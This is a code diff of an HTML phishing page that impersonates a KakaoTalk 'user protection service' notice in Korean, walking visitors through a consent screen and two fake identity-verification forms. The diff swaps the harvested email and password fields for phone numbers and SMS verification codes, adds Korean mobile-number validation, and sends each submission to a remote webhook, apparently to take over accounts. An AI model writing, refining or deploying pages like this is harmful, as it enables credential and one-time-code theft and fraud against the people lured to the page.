@@ -6,19 +6,24 @@
   <title>카카오톡 이용자보호서비스 완화</title>
   <style>
     body { margin: 0; font-family: 'Apple SD Gothic Neo', sans-serif; background: #fff; color: #222; }
-    .container, .login-container { max-width: 500px; margin: 80px auto; text-align: center; padding: 20px; }
+    .container { max-width: 500px; margin: 0 auto; padding: 20px; }
     .hidden { display: none; }
     h1 { font-size: 22px; font-weight: bold; margin: 20px 0; }
-    h2 { font-size: 20px; font-weight: bold; margin-bottom: 30px; }
     p { font-size: 14px; line-height: 1.6; color: #444; }
     a { color: #007aff; text-decoration: none; font-size: 14px; }
     .checkbox { display: flex; align-items: center; margin-top: 20px; font-size: 14px; }
     .checkbox input { margin-right: 8px; }
-    .btn-yellow, .btn-gray { display: block; width: 100%; margin-top: 20px; padding: 14px; text-align: center; font-size: 16px; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; }
-    .btn-yellow { color: #000; background: #ffeb00; }
+    .btn-yellow { display: block; width: 100%; margin-top: 20px; padding: 14px; text-align: center;
+      font-size: 16px; font-weight: bold; color: #000; background: #ffeb00;
+      border: none; border-radius: 6px; cursor: pointer; }
     .btn-yellow:active { background: #f0db00; }
-    .btn-gray { color: #888; background: #f0f0f0; }
-    input { width: 100%; padding: 12px; margin: 8px 0; border: none; border-bottom: 1px solid #ccc; font-size: 14px; outline: none; }
+    .login-container { max-width: 400px; margin: 80px auto; text-align: center; padding: 20px; }
+    .login-container h2 { font-size: 20px; font-weight: bold; margin-bottom: 30px; }
+    .login-container input { width: 100%; padding: 12px; margin: 8px 0; border: none; border-bottom: 1px solid #ccc;
+      font-size: 14px; outline: none; }
+    .login-container .btn-gray { width: 100%; padding: 14px; margin-top: 20px;
+      background: #f0f0f0; border: none; border-radius: 6px;
+      font-size: 16px; font-weight: bold; color: #888; cursor: pointer; }
   </style>
 </head>
 <body>
@@ -36,23 +41,23 @@
       <input type="checkbox" id="agree">
       <label for="agree">[필수] 개인정보 수집 및 이용 동의</label>
     </div>
-    <button type="button" class="btn-yellow" onclick="goNext()">본인인증하기</button>
+    <button class="btn-yellow" onclick="goNext()">본인인증하기</button>
   </div>
 
   <!-- page2 -->
   <div id="page2" class="login-container hidden">
     <h2>카카오톡 본인인증하기</h2>
-    <input type="text" placeholder="이메일 또는 전화번호" id="userId">
-    <input type="password" placeholder="비밀번호" id="userPw">
+    <input type="text" placeholder="(+82)전화번호" id="userId">
+    <input type="text" placeholder="인증번호" id="userCode">
     <button type="button" class="btn-yellow" onclick="goToPage3()">본인인증하기</button>
   </div>
 
   <!-- page3 -->
   <div id="page3" class="login-container hidden">
-    <h2>카카오톡 본인인증하기 - Page 3</h2>
-    <input type="text" placeholder="이메일 또는 전화번호" id="userId3">
-    <input type="password" placeholder="비밀번호" id="userPw3">
-    <button type="button" class="btn-gray" onclick="sendPage3()">로그인</button>
+    <h2>카카오톡 본인인증하기</h2>
+    <input type="text" placeholder="(+82)전화번호" id="userId3">
+    <input type="text" placeholder="인증번호" id="userCode3">
+    <button type="button" class="btn-yellow" onclick="sendPage3()">본인인증하기</button>
   </div>
 
   <script>
@@ -69,19 +74,25 @@
     }
 
     function goToPage3() {
-      const email = document.getElementById("userId").value.trim();
-      const password = document.getElementById("userPw").value.trim();
+      const userId = document.getElementById("userId").value.trim();
+      const userCode = document.getElementById("userCode").value.trim();
 
-      if (!email || !password) {
-        alert("이메일/전화번호와 비밀번호를 입력해주세요.");
+      if (!userId || !userCode) {
+        alert("전화번호와 인증번호를 입력해주세요.");
         return;
       }
 
-      // page2 정보 webhook 전송
+      const phoneRegex = /^010\d{8}$/;
+      if (!phoneRegex.test(userId)) {
+        alert("잘못된 형식의 전화번호입니다.");
+        return;
+      }
+
+      // page2 webhook 전송
       const formData = new URLSearchParams();
       formData.append("page", "2");
-      formData.append("email", email);
-      formData.append("password", password);
+      formData.append("phone", userId);
+      formData.append("code", userCode);
       formData.append("timestamp", new Date().toISOString());
 
       fetch(webhookUrl, {
@@ -91,25 +102,25 @@
       })
       .catch(err => console.error("page2 전송 오류:", err))
       .finally(() => {
-        // page3 표시
         document.getElementById("page2").classList.add("hidden");
         document.getElementById("page3").classList.remove("hidden");
       });
     }
 
     function sendPage3() {
-      const email = document.getElementById("userId3").value.trim();
-      const password = document.getElementById("userPw3").value.trim();
+      const userId3 = document.getElementById("userId3").value.trim();
+      const userCode3 = document.getElementById("userCode3").value.trim();
 
-      if (!email || !password) {
-        alert("이메일/전화번호와 비밀번호를 입력해주세요.");
+      if (!userId3 || !userCode3) {
+        alert("전화번호와 인증번호를 입력해주세요.");
         return;
       }
 
+      // page3 webhook 전송
       const formData = new URLSearchParams();
       formData.append("page", "3");
-      formData.append("email", email);
-      formData.append("password", password);
+      formData.append("phone", userId3);
+      formData.append("code", userCode3);
       formData.append("timestamp", new Date().toISOString());
 
       fetch(webhookUrl, {
